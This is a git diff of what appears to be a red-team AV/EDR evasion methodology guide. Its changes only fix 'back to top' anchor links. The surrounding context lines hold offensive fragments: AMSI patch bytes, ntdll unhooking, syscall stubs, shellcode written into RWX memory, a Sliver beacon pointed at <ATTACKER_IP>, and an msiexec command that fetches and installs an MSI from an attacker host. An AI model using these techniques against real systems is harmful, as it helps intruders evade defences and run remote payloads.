@@ -448,7 +448,7 @@ $buf = [byte[]]@(0xC3)             # ret
 
 > Patch BEFORE invoking AMSI bypass / running payload. Some EDRs hook the patch itself — combine with hardware-breakpoint or syscall-resolved primitives.
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -552,7 +552,7 @@ cargo build --release --target x86_64-pc-windows-gnu
 # Resolve syscall via DInvoke.Manualmap + DInvoke.DynamicInvoke.Generic.GetSyscallStub
 ```
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -634,7 +634,7 @@ NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
 // `base` now points at clean ntdll image — locate .text via PE parsing, copy over hooked region
 ```
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -713,7 +713,7 @@ sliver > generate beacon --mtls <ATTACKER_IP>:8443 --os windows --arch amd64 \
 # --obfuscate : Garble obfuscation (string + symbol mangling) on Go binary
 ```
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -816,7 +816,7 @@ memcpy(rwxRegion, shellcode, sizeof(shellcode));
 //   7. NtCreateThreadEx → resume
 ```
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -1237,7 +1237,7 @@ strings phish.ods | grep -i "/bin/bash"   # should return nothing
 strings phish.ods | grep -i "powershell"  # should return nothing (Windows variant)
 ```
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
@@ -1331,7 +1331,7 @@ msiexec /quiet /qn /i http://<ATTACKER_IP>:<ATTACKER_PORT>/exec-signed.msi
 
 > **OPSEC:** signtool stamps the SPC subject (`CN=<CA_NAME>-SPC`) into the MSI signature; defenders cross-checking against legitimate CA-issued cert records will spot the unauthorized SPC. For Purple-team detection-validation this is the desired IOC. For red-team work prefer signing CAs that match the org's normal posture (internal PKI, AD CS code-signing template — see [ESC1](active-directory-methodology.md#62-esc1-misconfigured-certificate-templates) / [ESC4](active-directory-methodology.md#63-esc4-vulnerable-certificate-template-acls) in active-directory-methodology.md).
 
-[↑ top](#table-of-contents)
+[↑ top](#av-edr-evasion-methodology)
 
 ---
 
